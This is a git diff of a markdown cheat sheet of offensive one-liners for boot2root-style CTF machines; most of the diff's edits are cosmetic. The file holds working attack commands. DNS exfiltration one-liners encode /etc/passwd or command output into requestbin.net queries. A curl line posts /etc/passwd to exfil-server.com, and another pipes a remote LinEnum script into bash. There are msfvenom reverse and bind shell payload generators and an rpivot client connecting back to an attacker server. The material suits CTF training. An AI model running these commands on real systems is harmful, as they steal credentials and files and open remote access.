@@ -9,30 +9,35 @@ Useful host enumeration snippets for boot2root-style CTFs.
 Usually the best first step is to run some port scans, at least on the common ports.
 
 Shameless plug, to automate all of your initial recon needs, check out my project [bscan](https://github.com/welchbj/bscan):
+
 ```sh
 export HOST=scanme.nmap.org
 /opt/bscan --max-concurrency 5 $HOST
 ```
 
 If you choose not to see the light, these Nmap snippets will prove useful (`-sT` used for speed; in real-life scenarios, use TCP SYN scanning with `-sS`):
+
 ```sh
 export HOST=scanme.nmap.org
 
-# quick TCP port scan on common ports
+# Quick TCP port scan on common ports.
 nmap -vv -n -Pn -sT -sV -sC --top-ports 1000 -oN $'nmap.tcp.quick.'${HOST}$'.'$(date -Iseconds) $HOST
 
-# thorough and complete TCP port scan on all ports
+# Thorough and complete TCP port scan on all ports.
 nmap -vv -n -Pn -sT -sV -sC -p- -oN $'nmap.tcp.thorough.'${HOST}$'.'$(date -Iseconds) $HOST
 
-# UDP scan
+# UDP scan.
 nmap -vv -n -Pn -sV -sC -sU -oN $'nmap.udp.'${HOST}$'.'$(date -Iseconds) $HOST
 ```
 
 ### HTTP Enumeration
 
+TODO: quick win file checks (~, .bak, , .swp, .swp~, .backup, .txt) x (.tar.gz, .gz)
+
 #### Directory Scanning
 
 [`gobuster`](https://github.com/OJ/gobuster) is the go-to tool for HTTP directory enumeration. Here's a good standard one-liner to get started:
+
 ```sh
 export URL=http://scanme.nmap.org/
 /opt/gobuster dir --useragent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 32 -u $URL | tee $'gobuster.'$(date -Iseconds)
@@ -41,6 +46,7 @@ export URL=http://scanme.nmap.org/
 Don't forget to add `-x php,xhtml`-style arguments based on any determined common file extensions.
 
 If you just want to look for some quick-and-easy wins, this `curl` snippet will get you started:
+
 ```sh
 export URL=http://scanme.nmap.org
 for path in robots.txt sitemap.xml security.txt .git/HEAD; do curl -vv -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' $URL/$path; done
@@ -49,6 +55,7 @@ for path in robots.txt sitemap.xml security.txt .git/HEAD; do curl -vv -A 'Mozil
 #### Web Application Firewall (WAF) Detection
 
 [wafw00f](https://github.com/EnableSecurity/wafw00f) should be your go-to tool for WAF detection and fingerprinting. It has pretty straightforward usage:
+
 ```sh
 export URL=http://scanme.nmap.org
 wafw00f $URL
@@ -81,6 +88,7 @@ This section goes over some automated methods. For manual checks, take a look at
 ### Automated Scripts
 
 Projects like [LinEnum](https://github.com/rebootuser/LinEnum) are great for automating tedious privilege escalation checks. Here is a snippet for downloading and running from the public web:
+
 ```sh
 curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 ```
@@ -112,23 +120,23 @@ Some restrictions are inherited from the DNS specification:
 The below one-liners provide mechanisms of generating a `/tmp/resolveme` file that encodes the desired payload into a series of domains that use this basic protocol. The only step that remains after generating this file is to execute the DNS queries that create the exfiltration traffic. Take note that these one-liners also generate the session bytes inline; if space is at a premium, you can do this offline and harcode it in the commands. Another implementation of the below snippets is that they provide a 5-character space for the sequence number; exfils involving larger sequences may have to adjust this logic.
 
 ```sh
-# python 2/3 file read with compression; use `./python3-dns-bin-retriever -d zlib -t TOKEN` to retrieve this
+# Python 2/3 file read with compression; use `./python3-dns-bin-retriever -d zlib -t TOKEN` to retrieve from dnsbin.
 python -c "s='.%02x'%__import__('random').getrandbits(8);d='.8f85be7ebfc30f73ebe5.d.requestbin.net';open('/tmp/resolveme','w').write('\n'.join(str(i)+s+'.'+x+d for i,x in enumerate(__import__('textwrap').fill(__import__('binascii').hexlify(__import__('zlib').compress(open('/etc/passwd','rb').read())).decode(),min(63,245-len(s)-len(d))).splitlines())))"
 
-# python 2/3 command exec with compression; use `./python3-dns-bin-retriever -d zlib -t TOKEN` to retrieve this
+# python 2/3 command exec with compression; use `./python3-dns-bin-retriever -d zlib -t TOKEN` to retrieve from dnsbin.
 python3 -c "s='.%02x'%__import__('random').getrandbits(8);d='.e004d291fe96f8880232.d.requestbin.net';open('/tmp/resolveme','w').write('\n'.join(str(i)+s+'.'+x+d for i,x in enumerate(__import__('textwrap').fill(__import__('binascii').hexlify(__import__('zlib').compress(__import__('subprocess').check_output('ls -la 2>&1',shell=True))).decode(),min(63,245-len(s)-len(d))).splitlines())))"
 
-# bash file read with compression; use `./python3-dns-bin-retriever -d gzip -t TOKEN` to retrieve this
+# Bash file read with compression; use `./python3-dns-bin-retriever -d gzip -t TOKEN` to retrieve from dnsbin.
 rm /tmp/resolveme; d='.17ccedcf3f3294a6cbcc.d.requestbin.net';i=0;sess=$(xxd -l 1 -p /dev/urandom); <data.txt gzip -c | xxd -c 31 -p | while read l; do echo $i.$sess.$l$d >> /tmp/resolveme; let i++; done
 ```
 
 And then sending that data from the target to your dnsbin listener:
 
 ```sh
-# dig name resolution
+# dig-powered name resolution.
 dig -f /tmp/resolveme
 
-# nslookup name resolution
+# nslookup-powered name resolution
 while read d; do nslookup $d; done </tmp/resolveme
 ```
 
@@ -144,10 +152,9 @@ Using PHP's `-S` standalone server mode, it is pretty simple to accept client fi
 
 #### Client-side
 
-Uploading files with POST requests can be achieved in a variety of ways:
+The simplest way of uploading files from the client side is to POST them with `curl`:
 
 ```sh
-# curl
 curl -vv -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -F 'f=@/etc/passwd' http://exfil-server.com:8888
 ```
 
@@ -204,28 +211,28 @@ Here are some snippets for generating common meterpreter payloads:
 export LISTEN_IP='10.10.10.10'
 export LISTEN_PORT='443'
 
-# linux 64-bit reverse shell meterpreter
+# Linux 64-bit reverse shell meterpreter.
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f elf > "reverse-shell_x86-64_${LISTEN_IP}_${LISTEN_PORT}.elf"
 
-# linux 32-bit reverse shell meterpreter
+# Linux 32-bit reverse shell meterpreter.
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f elf > "reverse-shell_x86_${LISTEN_IP}_${LISTEN_PORT}.elf"
 
-# linux 64-bit bind shell meterpreter
+# Linux 64-bit bind shell meterpreter.
 msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f elf > "bind-shell_x86-64_${LISTEN_PORT}.elf"
 
-# linux 32-bit bind shell meterpreter
+# Linux 32-bit bind shell meterpreter.
 msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f elf > "bind-shell_x86_${LISTEN_PORT}.elf"
 
-# windows 64-bit reverse shell meterpreter
+# Windows 64-bit reverse shell meterpreter.
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f exe > "reverse-shell_x86-64_${LISTEN_IP}_${LISTEN_PORT}.exe"
 
-# windows 32-bit reverse shell meterpreter
+# Windows 32-bit reverse shell meterpreter.
 msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f exe > "reverse-shell_x86_${LISTEN_IP}_${LISTEN_PORT}.exe"
 
-# windows 64-bit bind shell meterpreter
+# Windows 64-bit bind shell meterpreter.
 msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f exe > "bind-shell_x86-64_${LISTEN_PORT}.exe"
 
-# windows 32-bit bind shell meterpreter
+# Windows 32-bit bind shell meterpreter.
 msfvenom -p windows/x86/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f exe > "bind-shell_x86_${LISTEN_PORT}.exe"
 ```
 
@@ -244,7 +251,7 @@ run -j
 If you have a meterpreter session on a jump point in the network, you can have tools implicitly route their traffic through that point by adding a routing rule in metasploit:
 
 ```sh
-# make traffic to the 10.10.10.0/24 subnet route through session 1
+# Make traffic to the 10.10.10.0/24 subnet route through session 1.
 route add 10.10.10.0/24 1
 ```
 
@@ -290,18 +297,18 @@ Sometimes you end up on a box without credentials or any other of "forward" dyna
 It uses a client-server architecture, and only supports Python 2.6/2.7. On your attack machine, download and run the server:
 
 ```sh
-# download and package both the client and server into a zip file; allows for easier deployment
+# Download and package both the client and server into a zip file; allows for easier deployment.
 cd /opt && git clone https://github.com/klsecservices/rpivot && cd rpivot
 zip rpivot.zip -r *.py ./ntlm_auth/
 
-# run the server on your attack machine
+# Run the server on your attack machine.
 python rpivot.zip server --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9050
 ```
 
 Then transfer the built `rpivot.zip` file to the target and connect the client back to the server:
 
 ```sh
-# connect back to attacker-controlled server at 10.10.10.10
+# Connect back to attacker-controlled server at 10.10.10.10.
 python rpivot.zip client --server-ip 10.10.10.10 --server-port 9999
 ```
 
